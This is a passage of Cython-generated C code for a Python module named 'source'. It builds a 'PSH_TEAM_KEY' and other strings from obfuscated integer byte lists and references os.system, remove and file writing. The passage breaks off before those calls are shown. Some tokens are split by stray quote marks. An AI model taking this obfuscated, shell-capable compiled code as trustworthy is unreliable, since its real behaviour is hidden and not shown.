0, 1, 1},\n  {&__pyx_n_s_dirname, __pyx_k_dirname, sizeof(__pyx_k_dirname), 0, 0, 1, 1},\n  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},\n  {&__pyx_n_s_executable, __pyx_k_executable, sizeof(__pyx_k_executable), 0, 0, 1, 1},\n  {&__pyx_n_s_exist_ok, __pyx_k_exist_ok, sizeof(__pyx_k_exist_ok), 0, 0, 1, 1},\n  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},\n  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},\n  {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},\n  {&__pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define, __pyx_k_ifndef_PY_SSIZE_T_CLEAN_define, sizeof(__pyx_k_ifndef_PY_SSIZE_T_CLEAN_define), 0, 1, 0, 0},\n  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},\n  {&__pyx_n_s_isfile, __pyx_k_isfile, sizeof(__pyx_k_isfile), 0, 0, 1, 1},\n  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},\n  {&__pyx_n_s_makedirs, __pyx_k_makedirs, sizeof(__pyx_k_makedirs), 0, 0, 1, 1},\n  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_na""me), 0, 0, 1, 1},\n  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},\n  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},\n  {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},\n  {&__pyx_n_s_prefix, __pyx_k_prefix, sizeof(__pyx_k_prefix), 0, 0, 1, 1},\n  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},\n  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},\n  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},\n  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},\n  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},\n  {&__pyx_n_s_version, __pyx_k_version, sizeof(__pyx_k_version), 0, 0, 1, 1},\n  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},\n  {0, 0, 0, 0, 0, 0, 0}\n};\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {\n  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 92, __pyx_L1_error)\n  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 5713, __pyx_L1_error)\n  return 0;\n  __pyx_L1_error:;\n  return -1;\n}\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_InitCachedConstants\", 0);\n\n\n  __pyx_tuple_ = PyTuple_Pack(1, __pyx_int_0); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 92, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple_);\n  __Pyx_GIVEREF(__pyx_tuple_);\n\n\n  __pyx_slice__2 = PySlice_New(Py_None, __pyx_int_neg_1, Py_None); if (unlikely(!__pyx_slice__2)) __PYX_ERR(0, 5694, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_slice__2);\n  __Pyx_GIVEREF(__pyx_slice__2);\n\n\n  __pyx_tuple__3 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 5713, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__3);\n  __Pyx_GIVEREF(__pyx_tuple__3);\n  __Pyx_RefNannyFinishContext();\n  return 0;\n  __pyx_L1_e""rror:;\n  __Pyx_RefNannyFinishContext();\n  return -1;\n}\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {\n  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_32 = PyInt_FromLong(32); if (unlikely(!__pyx_int_32)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_38 = PyInt_FromLong(38); if (unlikely(!__pyx_int_38)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_45 = PyInt_FromLong(45); if (unlikely(!__pyx_int_45)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_46 = PyInt_FromLong(46); if (unlikely(!__pyx_int_46)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_47 = PyInt_FromLong(47); if (unlikely(!__pyx_int_47)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_48 = PyInt_FromLong(48); if (unlikely(!__pyx_int_48)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_49 = PyInt_FromLong(49); if (unlikely(!__pyx_int_49)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_50 = PyInt_FromLong(50); if (unlikely(!__pyx_int_50)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_53 = PyInt_FromLong(53); if (unlikely(!__pyx_int_53)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_55 = PyInt_FromLong(55); if (unlikely(!__pyx_int_55)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_56 = PyInt_FromLong(56); if (unlikely(!__pyx_int_56)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_61 = PyInt_FromLong(61); if (unlikely(!__pyx_int_61)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_65 = PyInt_FromLong(65); if (unlikely(!__pyx_int_65)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_66 = PyInt_FromLong(66); if (unlikely(!__pyx_int_66)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_67 = PyInt_FromLong(67); if (unlikely(!__pyx_int_67)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_69 = PyInt_FromLong(69); if (unlikely(!__pyx_int_69)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_72 = PyInt_FromLong(72); if (unlikely(!__pyx_int_72)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_73 = PyInt_F""romLong(73); if (unlikely(!__pyx_int_73)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_76 = PyInt_FromLong(76); if (unlikely(!__pyx_int_76)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_77 = PyInt_FromLong(77); if (unlikely(!__pyx_int_77)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_78 = PyInt_FromLong(78); if (unlikely(!__pyx_int_78)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_79 = PyInt_FromLong(79); if (unlikely(!__pyx_int_79)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_80 = PyInt_FromLong(80); if (unlikely(!__pyx_int_80)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_82 = PyInt_FromLong(82); if (unlikely(!__pyx_int_82)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_84 = PyInt_FromLong(84); if (unlikely(!__pyx_int_84)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_85 = PyInt_FromLong(85); if (unlikely(!__pyx_int_85)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_86 = PyInt_FromLong(86); if (unlikely(!__pyx_int_86)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_88 = PyInt_FromLong(88); if (unlikely(!__pyx_int_88)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_89 = PyInt_FromLong(89); if (unlikely(!__pyx_int_89)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_95 = PyInt_FromLong(95); if (unlikely(!__pyx_int_95)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_97 = PyInt_FromLong(97); if (unlikely(!__pyx_int_97)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_98 = PyInt_FromLong(98); if (unlikely(!__pyx_int_98)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_99 = PyInt_FromLong(99); if (unlikely(!__pyx_int_99)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_100 = PyInt_FromLong(100); if (unlikely(!__pyx_int_100)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_101 = PyInt_FromLong(101); if (unlikely(!__pyx_int_101)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_103 = PyInt_FromLong(103); if (unlikely(!__pyx_int_103)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_104 = PyInt_FromLong(104); if (unlikely(!__pyx_int_104)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_105 = PyInt_FromLong""(105); if (unlikely(!__pyx_int_105)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_108 = PyInt_FromLong(108); if (unlikely(!__pyx_int_108)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_110 = PyInt_FromLong(110); if (unlikely(!__pyx_int_110)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_111 = PyInt_FromLong(111); if (unlikely(!__pyx_int_111)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_112 = PyInt_FromLong(112); if (unlikely(!__pyx_int_112)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_114 = PyInt_FromLong(114); if (unlikely(!__pyx_int_114)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_116 = PyInt_FromLong(116); if (unlikely(!__pyx_int_116)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_117 = PyInt_FromLong(117); if (unlikely(!__pyx_int_117)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_118 = PyInt_FromLong(118); if (unlikely(!__pyx_int_118)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_119 = PyInt_FromLong(119); if (unlikely(!__pyx_int_119)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_120 = PyInt_FromLong(120); if (unlikely(!__pyx_int_120)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_121 = PyInt_FromLong(121); if (unlikely(!__pyx_int_121)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_128 = PyInt_FromLong(128); if (unlikely(!__pyx_int_128)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_145 = PyInt_FromLong(145); if (unlikely(!__pyx_int_145)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_159 = PyInt_FromLong(159); if (unlikely(!__pyx_int_159)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_168 = PyInt_FromLong(168); if (unlikely(!__pyx_int_168)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_174 = PyInt_FromLong(174); if (unlikely(!__pyx_int_174)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_216 = PyInt_FromLong(216); if (unlikely(!__pyx_int_216)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_240 = PyInt_FromLong(240); if (unlikely(!__pyx_int_240)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_neg_1 = PyInt_FromLong(-1); if (unlikely(!__pyx_int_neg_1)) __PYX_ERR(0, 5, __pyx_""L1_error)\n  return 0;\n  __pyx_L1_error:;\n  return -1;\n}\n\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/\n\nstatic int __Pyx_modinit_global_init_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_global_init_code\", 0);\n  /*--- Global init code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_export_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_variable_export_code\", 0);\n  /*--- Variable export code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_export_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_function_export_code\", 0);\n  /*--- Function export code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_init_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_type_init_code\", 0);\n  /*--- Type init code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_type_import_code\", 0);\n  /*--- Type import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_variable_import_code\", 0);\n  /*--- Variable import"" code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_function_import_code\", 0);\n  /*--- Function import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\n\n#ifndef CYTHON_NO_PYINIT_EXPORT\n#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC\n#elif PY_MAJOR_VERSION < 3\n#ifdef __cplusplus\n#define __Pyx_PyMODINIT_FUNC extern \"C\" void\n#else\n#define __Pyx_PyMODINIT_FUNC void\n#endif\n#else\n#ifdef __cplusplus\n#define __Pyx_PyMODINIT_FUNC extern \"C\" PyObject *\n#else\n#define __Pyx_PyMODINIT_FUNC PyObject *\n#endif\n#endif\n\n\n#if PY_MAJOR_VERSION < 3\n__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/\n__Pyx_PyMODINIT_FUNC initsource(void)\n#else\n__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/\n__Pyx_PyMODINIT_FUNC PyInit_source(void)\n#if CYTHON_PEP489_MULTI_PHASE_INIT\n{\n  return PyModuleDef_Init(&__pyx_moduledef);\n}\nstatic CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {\n    #if PY_VERSION_HEX >= 0x030700A1\n    static PY_INT64_T main_interpreter_id = -1;\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);\n    if (main_interpreter_id == -1) {\n        main_interpreter_id = current_id;\n        return (unlikely(current_id == -1)) ? -1 : 0;\n    } else if (unlikely(main_interpreter_id != current_id))\n    #else\n    static PyInterpreterState *main_interpreter = NULL;\n    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;\n    if (!main_interpreter) {\n        main_interpreter = current_interpreter;\n    } else if (unlikely(main_interpreter != current_interpreter))\n    #endif\n    {\n        PyErr_SetString(\n            PyExc_ImportError,\n            \"Interpreter change detected - this module can only be loaded into one interpreter per process.\");\n        return -1;\n    }\n    return 0;\n}\nstatic CY""THON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {\n    PyObject *value = PyObject_GetAttrString(spec, from_name);\n    int result = 0;\n    if (likely(value)) {\n        if (allow_none || value != Py_None) {\n            result = PyDict_SetItemString(moddict, to_name, value);\n        }\n        Py_DECREF(value);\n    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {\n        PyErr_Clear();\n    } else {\n        result = -1;\n    }\n    return result;\n}\nstatic CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {\n    PyObject *module = NULL, *moddict, *modname;\n    if (__Pyx_check_single_interpreter())\n        return NULL;\n    if (__pyx_m)\n        return __Pyx_NewRef(__pyx_m);\n    modname = PyObject_GetAttrString(spec, \"name\");\n    if (unlikely(!modname)) goto bad;\n    module = PyModule_NewObject(modname);\n    Py_DECREF(modname);\n    if (unlikely(!module)) goto bad;\n    moddict = PyModule_GetDict(module);\n    if (unlikely(!moddict)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"loader\", \"__loader__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"origin\", \"__file__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"parent\", \"__package__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"submodule_search_locations\", \"__path__\", 0) < 0)) goto bad;\n    return module;\nbad:\n    Py_XDECREF(module);\n    return NULL;\n}\n\n\nstatic CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)\n#endif\n#endif\n{\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  int __pyx_t_4;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  PyObject *__pyx_t_8 = NULL;\n  PyObject *__pyx_t_9 = ""NULL;\n  PyObject *__pyx_t_10 = NULL;\n  int __pyx_t_11;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  if (__pyx_m) {\n    if (__pyx_m == __pyx_pyinit_module) return 0;\n    PyErr_SetString(PyExc_RuntimeError, \"Module 'source' has already been imported. Re-initialisation is not supported.\");\n    return -1;\n  }\n  #elif PY_MAJOR_VERSION >= 3\n  if (__pyx_m) return __Pyx_NewRef(__pyx_m);\n  #endif\n  #if CYTHON_REFNANNY\n__Pyx_RefNanny = __Pyx_RefNannyImportAPI(\"refnanny\");\nif (!__Pyx_RefNanny) {\n  PyErr_Clear();\n  __Pyx_RefNanny = __Pyx_RefNannyImportAPI(\"Cython.Runtime.refnanny\");\n  if (!__Pyx_RefNanny)\n      Py_FatalError(\"failed to import 'refnanny' module\");\n}\n#endif\n  __Pyx_RefNannySetupContext(\"__Pyx_PyMODINIT_FUNC PyInit_source(void)\", 0);\n  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #ifdef __Pxy_PyFrame_Initialize_Offsets\n  __Pxy_PyFrame_Initialize_Offsets();\n  #endif\n  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_empty_bytes = PyBytes_FromStringAndSize(\"\", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_empty_unicode = PyUnicode_FromStringAndSize(\"\", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 5, __pyx_L1_error)\n  #ifdef __Pyx_CyFunction_USED\n  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Generator_USED\n  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_AsyncGen_USED\n  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_StopAsyncIteration_U""SED\n  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  /*--- Library function declarations ---*/\n  /*--- Threads initialization code ---*/\n  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS\n  PyEval_InitThreads();\n  #endif\n  /*--- Module creation code ---*/\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  __pyx_m = __pyx_pyinit_module;\n  Py_INCREF(__pyx_m);\n  #else\n  #if PY_MAJOR_VERSION < 3\n  __pyx_m = Py_InitModule4(\"source\", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);\n  #else\n  __pyx_m = PyModule_Create(&__pyx_moduledef);\n  #endif\n  if (unlikely(!__pyx_m)) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 5, __pyx_L1_error)\n  Py_INCREF(__pyx_d);\n  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 5, __pyx_L1_error)\n  Py_INCREF(__pyx_b);\n  __pyx_cython_runtime = PyImport_AddModule((char *) \"cython_runtime\"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 5, __pyx_L1_error)\n  Py_INCREF(__pyx_cython_runtime);\n  if (PyObject_SetAttrString(__pyx_m, \"__builtins__\", __pyx_b) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  /*--- Initialize various global constants etc. ---*/\n  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)\n  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  if (__pyx_module_is_main_source) {\n    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  }\n  #if PY_MAJOR_VERSION >= 3\n  {\n    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 5, __pyx_L1_error)\n    if (!PyDict_GetItemString(modules, \"source\")) {\n      if (unlikely(PyDict_SetItemStrin""g(modules, \"source\", __pyx_m) < 0)) __PYX_ERR(0, 5, __pyx_L1_error)\n    }\n  }\n  #endif\n  /*--- Builtin init code ---*/\n  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  /*--- Constants init code ---*/\n  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  /*--- Global type/function init code ---*/\n  (void)__Pyx_modinit_global_init_code();\n  (void)__Pyx_modinit_variable_export_code();\n  (void)__Pyx_modinit_function_export_code();\n  (void)__Pyx_modinit_type_init_code();\n  (void)__Pyx_modinit_type_import_code();\n  (void)__Pyx_modinit_variable_import_code();\n  (void)__Pyx_modinit_function_import_code();\n  /*--- Execution code ---*/\n  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)\n  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n\n\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyList_New(9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_INCREF(__pyx_int_216);\n  __Pyx_GIVEREF(__pyx_int_216);\n  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_216);\n  __Pyx_INCREF(__pyx_int_168);\n  __Pyx_GIVEREF(__pyx_int_168);\n  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_168);\n  __Pyx_INCREF(__pyx_int_216);\n  __Pyx_GIVEREF(__pyx_int_216);\n  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_216);\n  __Pyx_INCREF(__pyx_int_174);\n  __Pyx_GIVEREF(__pyx_int_174);\n  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_174);\n  __Pyx_INCREF(__pyx_int_32);\n  __""Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_32);\n  __Pyx_INCREF(__pyx_int_240);\n  __Pyx_GIVEREF(__pyx_int_240);\n  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_240);\n  __Pyx_INCREF(__pyx_int_159);\n  __Pyx_GIVEREF(__pyx_int_159);\n  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_int_159);\n  __Pyx_INCREF(__pyx_int_145);\n  __Pyx_GIVEREF(__pyx_int_145);\n  PyList_SET_ITEM(__pyx_t_1, 7, __pyx_int_145);\n  __Pyx_INCREF(__pyx_int_128);\n  __Pyx_GIVEREF(__pyx_int_128);\n  PyList_SET_ITEM(__pyx_t_1, 8, __pyx_int_128);\n  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PSH_TEAM_KEY, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyList_New(29); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_INCREF(__pyx_int_46);\n  __Pyx_GIVEREF(__pyx_int_46);\n  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_46);\n  __Pyx_INCREF(__pyx_int_80);\n  __Pyx_GIVEREF(__pyx_int_80);\n  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_80);\n  __Pyx_INCREF(__pyx_int_89);\n  __Pyx_GIVEREF(__pyx_int_89);\n  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_89);\n  __Pyx_INCREF(__pyx_int_95);\n  __Pyx_GIVEREF(__pyx_int_95);\n  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_95);\n  __Pyx_INCREF(__pyx_int_80);\n  __Pyx_GIVEREF(__pyx_int_80);\n  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_80);\n  __Pyx_INCREF(__pyx_int_82);\n  __Pyx_GIVEREF(__pyx_int_82);\n  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_82);\n  __Pyx_INCREF(__pyx_int_73);\n  __Pyx_GIVEREF(__pyx_int_73);\n  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_int_73);""\n  __Pyx_INCREF(__pyx_int_86);\n  __Pyx_GIVEREF(__pyx_int_86);\n  PyList_SET_ITEM(__pyx_t_1, 7, __pyx_int_86);\n  